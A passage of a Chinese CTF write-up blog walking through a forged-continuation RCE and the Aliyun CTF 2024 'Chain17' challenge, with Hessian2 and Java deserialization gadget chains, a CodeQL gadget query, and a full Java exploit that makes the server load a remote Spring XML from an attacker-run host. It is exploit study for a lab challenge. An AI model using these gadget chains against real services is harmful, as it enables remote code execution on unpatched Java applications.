+<p>调试了一下发现我犯蠢了，stackFrameHead是ContinuationImpl::run那一帧，我前文还提到过的。我上面的exp是按stackFrameHead是suspend那一帧来写的，修改一下exp</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NzFjODM2NWRlZWU4MjYyMmI0NTI2NGM1NjJhMDQxYTlfbU9qdTNscHBkeWI5bkZuSktsU2xwTXEzbnFEd0Y4MU9fVG9rZW46U28wY2I3ZjQzb0g3SGh4VFpCSWN2WkZqbk5mXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>改好了，不报上面那个错了，报新的错</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NThkZjAyODhhNWE3OWJiMTQ2Njc2MTVhNTFmMDQwZTRfWFVwUUpQSlpZTVdGU0M2YkRXWjF1Q1l0QXYwcDhQNHhfVG9rZW46RlE1ZGJ5VnZZb1lQd3d4T2djNWN1cDFiblJmXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>说是pointers的长度不对，再次看了看wp，我发现我又唐了，continuation恢复运行时是从bci后的开始运行，所以我应该将bci指定为exec前一个invoke(后文有解释为什么长度不对)</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=OTc4NTRiNzU2ZWU2YzdmMzEyODRhZWI0YjczZDFlMzNfWFIxZE1NdVc5WTQyWTFGYUU0MXNKaVRoMVpRUnN3R0VfVG9rZW46RWlsVWIyTklIb0tqRXd4dDVrTmN3SmhGbktkXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>由上上图可知我要将bci改为87，但为什么pointers的长度还是不合法，我明明就是按照toDebugString输出的规律来的</p>
+<p>不能将bci改为87，因为栈由3个部分组成，操作数栈，局部变量表，动态链接(不重要)。局部变量表是在方法执行前就定义好的，也就是pointers,而操作数栈中有个地方叫操作数栈顶，aload,astore就是在操作数栈顶与局部变量表中进行操作。aload将局部变量表中的东西压入操作数栈顶，astore将栈顶数据压入局部变量表。</p>
+<p>我们知道每调用一个方法就会新开一个栈，一旦调用了invoke,此时当前操作数栈顶的值就会被压入新的栈中，此时栈顶值就清空了，而每个方法都有return，return就是将值返回到新开栈之前的那个栈的操作数栈顶处。而因为挂起后恢复执行时方法是重新开始执行的，此时栈为空，这是其他wp的解释，我对此的解释是:因为bci必须在invoke处，所以在挂起时其实当前栈正在调用这个invoke函数，而在当前栈内调用函数是会将当前操作数栈顶的数据全部压入新栈中，所以重新恢复执行时当前栈顶是没有数据的。假如我们bci设为87，重新开始执行第一步就是执行90，将slot_2压入栈顶中，但栈顶此时就只有一个值，即pointers的第三个值，但是exec需要两个参数，一个Runtime实例，一个cmd的string。若bci为83，其实根据函数的调用顺序可以知道83这个函数其实里面还有return没有执行就被挂起了，所以恢复执行后这个PrintExecCmd函数会return一个值，但这个函数不会用到我们构造的pointers，因为它的参数早在挂起的时候就已经被保存了，所以为了控制exec的参数，我看了两篇wp，有两种方法，</p>
+<h2 id="第一种-构造PrintExecCmd帧。"><a href="#第一种-构造PrintExecCmd帧。" class="headerlink" title="第一种:构造PrintExecCmd帧。"></a>第一种:构造PrintExecCmd帧。</h2><p>我们来理解一下stackFrameHead的逻辑。我们知道在一个栈中调用一个方法会开一个新栈，当新栈运行完毕后会return一个数据到当前栈顶，此时当前栈才会继续运行下去。我们把这个逻辑用到resume()方法上。stackFrameHead是一个单向链表，也是一个FrameRecord,即一个栈帧，这个栈帧的next,我们可以将它理解为当前栈中开了一个新栈，所以当前栈就停在了调用next方法的位置，以此类推，直到最后一个suspend。当进行resume()时，就会从suspend那个FrameRecord的前一个FrameRecord开始执行，而在那个栈帧又是从调用suspend的下一条字节码语句开始执行。就如同老栈调用方法开新栈，新栈会return一个数据给老栈一样，stackFrameHead这个单向链表也是如此，会按照执行顺序依次return。所以第一种方法就是按照PrinterSpooler:run方法字节码中的顺序一样，将PrintExecCmd作为run的新栈，控制PrintExecCmd就可以实现rce。</p>
+<p>这是PrintExecCmd的部分字节码</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=MjNkNDQ4MDcwNTM4NmMzMGQ3NTM1NmI4MTY3YTIxNDZfclMyeU82M0ZBRnlpUHJJdlhKMjlSNk5mNDk3Vnh5NnlfVG9rZW46THJ2QWIyNlBLb0hRcW54YTdkb2N0Q1lnbkxlXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>很明显，bci设为492，aastore是将栈顶的值储存到一个变量数组中，执行aastore后栈顶清空，507又有一个aastore,栈顶又空了，最终return局部变量表中的slot_13,即需要局部变量表要有14个slot(因为起始为0)。</p>
+<h2 id="第二种-伪造"><a href="#第二种-伪造" class="headerlink" title="第二种:伪造"></a>第二种:伪造</h2><p>因为resume()的逻辑不会管你是不是按照字节码的顺序，它默认这个执行流是安全的，不会检查return数据的这个方法是不是你字节码中应该return的那个方法。所以只需要一个return的是一个能控制的字符串的方法，一篇wp找到的是这个方法</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=YTc5ZTUyZWZkNTE1ZDdjY2RjY2M1NTZmNmViNjc2N2Vfa1BSeUNua216TllSMU5jczdqMklMazZ0NnhrSVBNUjVfVG9rZW46QlB4SGJJbWZ1b1RCcWN4cm1memN3eVB2bmloXzE3NzQxNTIzNDY6MTc3NDE1NTk0Nl9WNA" alt="img"></p>
+<p>很好理解，283调用的这个方法没有返回值，所以此时栈顶只有286从局部变量表中加载的slot_10,我们将slot_10改为我们需要执行的命令的即可。</p>
+<p>因为远程没有自定义的Job类，所以要把Continuation::entrypoint改为null，删除job那一帧，反正是倒着执行，对结果没有影响。</p>
+<p>因为此题Linux和win的jdk中的PrinterSpooler所在类不同，所以用win无法打通远程脚本，得用linux.</p>
+<h1 id="Chain17"><a href="#Chain17" class="headerlink" title="Chain17"></a>Chain17</h1><p>看了下依赖，有一个h2，想到了nctf那道h2 revenge，尝试用上次的payload，但是发现POJONode版本不一样，chain17的版本PojoNode的爷爷类BaseJsonNode没有实现Serializeable接口，看了其他的依赖，发现没有啥能触发getter的链子。h2应该打不了。也看到了tomcat的依赖，想到了cve-2025-24813,尝试了一下，也不行。也有Jackson依赖，但第一这是jdk17,版本太高，很多链子用不了，第二pojonode那条通杀链也用不了，jackson也打不了，而且我突然想到只有ObjectMapper.readValue()会调用反序列化类的setter,ObjectInputStream.readObject()是不会调用目标类的setter,所以jackson反序列化的链子应该是用不了的。又看到了hessian-lite依赖，感觉经常看到hessian反序列化但是一直没去学过，看了看相关文章，发现很多都是用rome链子，但是这题又没有rome依赖，</p>
+<p>所以我要去找一条这题有的依赖的相关链子，</p>
+<ol>
+<li>Spring AOP链，黑名单有org.springframework.jndi，SimpleJndiFactory用不了。java.security也ban了SignedObejct二次反序列化也不行</li>
+<li>Spring AOP &amp; Context链，黑名单有org.framework.aop.aspectj</li>
+</ol>
+<p>会不会是混合链子，AOP链只有最后触发JNDI的SimpleJndiFactory被ban了，找找其他能通过getBean()触发JNDI的类，没找到。而且高版本jdk有jndi限制很麻烦。我得看看wp</p>
+<p>但其实这是hessian2反序列化，实现不实现Serializable接口并不是那么重要，看了wp发现我上述的大部分用不了的链子都用上了。</p>
+<h2 id="总体链络"><a href="#总体链络" class="headerlink" title="总体链络"></a>总体链络</h2><p>是hessian2来进行反序列化，所以最外层要用一个Map,而agent的pom有hutool依赖，这个依赖中有JSONObject类，是个Map,JSONObject#put会调用value的toString方法，但有个限制是value必须是java内部类，AtomicReference#toString会调用自身value字段的toString方法，而POJONode#toString会调用value字段的getter方法。而题目给了一个Bean类，有个getObject方法，会使用Java原生反序列化类ObjectInputStream反序列化data字段并将反序列化的结果返回。</p>
+<p>wp给的做法并没有利用readObject,而是通过jackson的一个机制:如果调用类的getter方法返回了一个对象，那就继续调用这个对象的getter方法。</p>
+<p>wp采用了hutool依赖的DataSourceWrapper#getConnection,实现了h2的rce</p>
+<p>官方wp用了Bean链二次反序列化，但我实测不用bean也可以(但是其他人的wp说Hessian2反序列化是调用的无参构造，而PooledDSFactory无参构造会在后面报错?)</p>
+<blockquote>
+<p>这个地方为什么要套上一层Bean</p>
+<p>Bean bean &#x3D; new Bean();bean.setData(SerializeUtil.serialize(pooledDSFactory));</p>
+<p>问题就在于JavaDeserializer实例化PooledDSFactory的时候调用的是无参构造。</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=OTA5MmFhNjZmYTk2M2E0NGUyYWIyMjkyNWQyM2RkZTlfNnhkdzY0RE5UaGx3VTZSM3JUdHVvUGF1Zkt0ZDgxV2FfVG9rZW46WVdxQ2J0WVRkb3BYYU14VHFRS2NGM016blZjXzE3NzQxNTI1NTc6MTc3NDE1NjE1N19WNA" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">createDbSetting:87, GlobalDbConfig (cn.hutool.db)</span><br><span class="line">&lt;init&gt;:50, AbstractDSFactory (cn.hutool.db.ds)</span><br><span class="line">&lt;init&gt;:25, PooledDSFactory (cn.hutool.db.ds.pooled)</span><br><span class="line">&lt;init&gt;:21, PooledDSFactory (cn.hutool.db.ds.pooled)</span><br><span class="line">instantiate:313, JavaDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:202, JavaDeserializer (com.alibaba.com.caucho.hessian.io)</span><br></pre></td></tr></table></figure>
+
+<p>若是无参构造，走到这里的时候会去加载配置文件。然后没有配置文件的话就会抛出异常报错。</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ODExMTNlYzU5OTlkOTA2YzAwYTJmNTIwOGIzNDgwOWRfbzNMOEIyWDM5TFU3OGRsM05SWDlwcWpmSG1SRGlZY2dfVG9rZW46RklBcWJSZjNsb29HYnh4OHZaaGNKVmt2bmR4XzE3NzQxNTI1NTc6MTc3NDE1NjE1N19WNA" alt="img"></p>
+</blockquote>
+<p>这也太细了…,这也没啥报错咋能想到的。而且我trycatch了都没有报错输出啊</p>
+<p>我知道为什么我不用bean也可以，因为我导入的Hessian2依赖跟题目的Hessian2不一样，题目的是com.alibaba.com.caucho.hessian.io.Hessian2Output我的是com.caucho.hessian.io.Hessian2Output</p>
+<p>所以还是必须要用bean</p>
+<p>但是我本地就能成功反序列化，远程又不行了java.lang.IllegalArgumentException: Input byte array has wrong 4-byte ending unit又是这个东西，难道又要用Linux输出？</p>
+<p>搞了一天，学了怎么打jar和在Linux中改java版本，可是为什么，还是报一样的错呢？我很绝望</p>
+<p>霖哥说是题目环境问题，我相信他，不折磨自己了</p>
+<p>我知道了。这个接收参数不能加键名，以后真得多调试了，我根本就没想到要调试jar包。</p>
+<p>h2语言中create alias 后面的方法一定要throws 异常，如果在函数体内try catch是不符合语法规范，执行不了的。</p>
+<p>最终进行连接的函数是PooledDataSource#newConnection</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=YTgzMjA0YjJjM2YyOGU1Yzc3ZDFkZjU2ZTFmMWY0YWZfWlZ5eWprWmlXcmpJbHZpckFPNXRGbHI1NmkzOWxLbjNfVG9rZW46RUxwMWJQSUY1b0xkUXF4Nk1ndmN4dlJSbkRlXzE3NzQxNTI1NTc6MTc3NDE1NjE1N19WNA" alt="img"></p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=YWYzMzQzMDM5OWU0OWJlNDg5OWM3MjZiNWMyMmQ3OTJfamtJY2Q5U0xJVGxDczhBb2xqVkxPUU1jb1ZVMHl4MzFfVG9rZW46WWpEOWJRS2x4b2JLb3l4M1kwZmNZNHpnbkZmXzE3NzQxNTI1NTc6MTc3NDE1NjE1N19WNA" alt="img"></p>
+<h2 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h2><p>Server公网访问不了，要通过agent来访问。</p>
+<p>而agent已经实现了h2rce，可以通过create alias来给server传递反序列化payload.</p>
+<p>server反序列化是Java原生类ObjectInputStream,所以找正常readobject链</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NzlmZDRhNmQ5OTRjNzkxOWM3YmU2YzY4YjBhOWIzM2VfaFJTQUdONExKb0F2ZG9kT3ZtaHFLdjJVZlpLME5uM0ZfVG9rZW46UEFoN2JmaFB1b1QwNDl4SDJrVGNlSEdSbmJmXzE3NzQxNTI1NTc6MTc3NDE1NjE1N19WNA" alt="img"></p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=MGI4OGMwMzAyNmViOWE5YmU4YmU5MDIwNjQ1N2EwZTlfbWU0RnNnQXlaWUV5QjhZRVR5MnFlQ2ZMd01DT3R6WHBfVG9rZW46WFc5dGJ2UjBqbzdvZzd4dU5JMmNZa3gyblliXzE3NzQxNTI1NTc6MTc3NDE1NjE1N19WNA" alt="img"></p>
+<p>pom中有两个依赖spring,jooq.lib中还有jackson依赖</p>
+<p>我搜了一下pom文件中的内容只对编译，打包，构建时起作用，一般lib文件夹下的jar包是包含在运行时的classpath里面的，所以反序列化payload中包含lib中的类也是可以成功反序列化的。</p>
+<p>因为readobject,所以EventListener-PojoNode可用。</p>
+<p>通过codeql查询，source为getter，sink点为调用了ClassPathXmlApplicationContext构造函数的方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"><span class="doctag">@kind</span> path-problem</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> java</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Source</span> <span class="keyword">extends</span> <span class="title class_">Method</span>&#123;</span><br><span class="line">    Source()&#123;</span><br><span class="line">        <span class="built_in">this</span>.getDeclaringType().getASupertype*() <span class="keyword">instanceof</span> TypeSerializable and</span><br><span class="line">        <span class="built_in">this</span>.getName().indexOf(<span class="string">&quot;get&quot;</span>) = <span class="number">0</span> and</span><br><span class="line">        <span class="built_in">this</span>.getName().length() &gt; <span class="number">3</span> and</span><br><span class="line">        <span class="built_in">this</span>.isPublic() and</span><br><span class="line">        <span class="built_in">this</span>.fromSource() and</span><br><span class="line">        <span class="built_in">this</span>.hasNoParameters()</span><br><span class="line">        and</span><br><span class="line">        <span class="title function_">getDeclaringType</span><span class="params">()</span>.getQualifiedName().matches(<span class="string">&quot;%jooq%&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sink</span> <span class="keyword">extends</span> <span class="title class_">Method</span>&#123;</span><br><span class="line">    Sink()&#123;</span><br><span class="line">        exists(MethodAccess ac|  </span><br><span class="line">            ac.getMethod().getName().matches(<span class="string">&quot;%newInstance%&quot;</span>)</span><br><span class="line">            and</span><br><span class="line">            ac.getMethod().getNumberOfParameters() = <span class="number">1</span> </span><br><span class="line">            and</span><br><span class="line">            <span class="title function_">getDeclaringType</span><span class="params">()</span>.getQualifiedName().matches(<span class="string">&quot;%jooq%&quot;</span>)</span><br><span class="line">            <span class="type">and</span> </span><br><span class="line">            <span class="variable">this</span> <span class="operator">=</span> ac.getCaller() </span><br><span class="line">        )</span><br><span class="line">        and</span><br><span class="line">        <span class="title function_">getDeclaringType</span><span class="params">()</span>.getASupertype*() <span class="keyword">instanceof</span> TypeSerializable</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">query predicate <span class="title function_">edges</span><span class="params">(Method a, Method b)</span> &#123; </span><br><span class="line">    a.polyCalls(b)and</span><br><span class="line">    (a.getDeclaringType().getASupertype*() <span class="keyword">instanceof</span> TypeSerializable or a.isStatic()) and</span><br><span class="line">    (b.getDeclaringType().getASupertype*() <span class="keyword">instanceof</span> TypeSerializable or b.isStatic()) </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Source source, Sink sink</span><br><span class="line">where edges+(source, sink)</span><br><span class="line">select source, source, sink, <span class="string">&quot;$@ $@ to $@ $@&quot;</span> ,</span><br><span class="line">source.getDeclaringType(),source.getDeclaringType().getName(),</span><br><span class="line">source,source.getName(),</span><br><span class="line">sink.getDeclaringType(),sink.getDeclaringType().getName(),</span><br><span class="line">sink,sink.getName()</span><br></pre></td></tr></table></figure>
+
+<p>wp说的是配合手筛，我理解的就是从步数最少的开始尝试</p>
+<p>ConvertedVal#getValue -&gt; ConvertAll#from</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">aliyunctf2024_chain17_server_exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">convertedVal</span> <span class="operator">=</span> Util.createWithoutConstructor(Class.forName(<span class="string">&quot;org.jooq.impl.ConvertedVal&quot;</span>));</span><br><span class="line">    <span class="type">Object</span> <span class="variable">dataTypeProxy</span> <span class="operator">=</span> Util.createWithoutConstructor(Class.forName(<span class="string">&quot;org.jooq.impl.DataTypeProxy&quot;</span>));</span><br><span class="line">    <span class="type">Object</span> <span class="variable">delegate</span> <span class="operator">=</span> Util.createWithoutConstructor(Class.forName(<span class="string">&quot;org.jooq.impl.Val&quot;</span>));</span><br><span class="line">    <span class="type">Object</span> <span class="variable">arrayDataType</span> <span class="operator">=</span> Util.createWithoutConstructor(Class.forName(<span class="string">&quot;org.jooq.impl.ArrayDataType&quot;</span>));</span><br><span class="line">    <span class="type">Object</span> <span class="variable">name</span> <span class="operator">=</span> Util.createWithoutConstructor(Class.forName(<span class="string">&quot;org.jooq.impl.UnqualifiedName&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">commentImpl</span> <span class="operator">=</span> Util.createWithoutConstructor(Class.forName(<span class="string">&quot;org.jooq.impl.CommentImpl&quot;</span>));</span><br><span class="line">    Util.setFieldValue(commentImpl,<span class="string">&quot;comment&quot;</span>,<span class="string">&quot;11111&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Util.setFieldValue(delegate,<span class="string">&quot;value&quot;</span>,<span class="string">&quot;http://192.168.109.1:17878/bean.xml&quot;</span>);</span><br><span class="line">    Util.setFieldValue(arrayDataType,<span class="string">&quot;uType&quot;</span>,ClassPathXmlApplicationContext.class);</span><br><span class="line">    Util.setFieldValue(dataTypeProxy,<span class="string">&quot;type&quot;</span>,arrayDataType);</span><br><span class="line">    Util.setFieldValue(convertedVal,<span class="string">&quot;type&quot;</span>,dataTypeProxy);</span><br><span class="line">    Util.setFieldValue(convertedVal,<span class="string">&quot;delegate&quot;</span>,delegate);</span><br><span class="line">    Util.setFieldValue(convertedVal,<span class="string">&quot;name&quot;</span>,name);</span><br><span class="line">    Util.setFieldValue(convertedVal,<span class="string">&quot;comment&quot;</span>,commentImpl);</span><br><span class="line"></span><br><span class="line">    <span class="type">POJONode</span> <span class="variable">pojoNode</span> <span class="operator">=</span> Gadget.getPOJONode(convertedVal);</span><br><span class="line">    <span class="type">EventListenerList</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">UndoManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();</span><br><span class="line">    <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) Util.getFieldValue(manager, <span class="string">&quot;edits&quot;</span>);</span><br><span class="line">    vector.add(pojoNode);</span><br><span class="line">    Util.setFieldValue(list, <span class="string">&quot;listenerList&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;InternalError.class, manager&#125;);</span><br><span class="line"></span><br><span class="line">    System.out.println(Util.base64Encode(Util.serialize(list)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功复现</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=YjJhYWE3YjYyNmFkNzI5NTg0N2E1NTUyNjdlYTkyMDdfdDJkVFlKeFFRM3FaaXRLMnpka21aMEJmdTVsc25tN1NfVG9rZW46TGZBOWJDc05GbzhHcmR4QmZaMGNFNUVIbkloXzE3NzQxNTI1NTc6MTc3NDE1NjE1N19WNA" alt="img"></p>
+
+  </div>
+
+  
+  <div class="about">
+    <h1>About this Post</h1>
+    <div class="details">
+      <p>This post is written by DashingBug, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+    </div>
+    
+  </div>
+  
+
+  <div class="container post-prev-next">
+    
+    <a href="/2025/04/25/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="next">
+      <div class="text">
+        <p class="label">Next</p>
+        <h3 class="title">Hessian反序列化</h3>
+      </div>
+    </a>
+    
+    
+    <a href="/2025/03/28/JDBC%E5%AD%A6%E4%B9%A0/" class="prev">
+      <div class="text">
+        <p class="label">Previous</p>
+        <h3 class="title">JDBC学习</h3>
+      </div>
+    </a>
+    
+  </div>
+
+  
+    
+    
+  
+</article>
+
+
+    </main>
+    <footer>
+  <div class="inner">
+    <div class="links">
+      
+      <div class="group">
+        <h2 class="title">Blog</h2>
+        
+        <a href="/" class="item">Home</a>
+        
+        <a href="/archives" class="item">Archives</a>
+        
+        <a href="/tags" class="item">Tags</a>
+        
+        <a href="/categories" class="item">Categories</a>
+        
+        <a href="/search" class="item">Search</a>
+        
+        <a href="/links" class="item">link</a>
+        
+        <a href="/projects" class="item">Projects</a>
+        
+        <a href="/resume" class="item">Resume</a>
+        
+        <a href="/about" class="item">About</a>
+        
+        <a href="/atom.xml" class="item">RSS</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Projects</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/next-mastodon-gallery" class="item">Next Mastodon Gallery</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Me</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+        
+        <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+        
+        <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+        
+        <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+        
+        <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+        
+      </div>
+      
+    </div>
+    <span>&copy; 2026 DashingBug<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></span>
+    
+    
+      <br>
+      <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+        <label>
+          <input type="radio" value="light">
+          <span>Light</span>
+        </label>
+        <label>
+          <input type="radio" value="dark">
+          <span>Dark</span>
+        </label>
+        <label>
+          <input type="radio" value="auto">
+          <span>Auto</span>
+        </label>
+      </div>
+    
+  </div>
+</footer>
+
+
+    
+<script src="/js/main.js"></script>
+
+
+    
+
+    
+    
+<script src="/js/scroll-reveal.js"></script>
+
+    
+
+    
+
+    
+
+    
+  </body>
+</html>
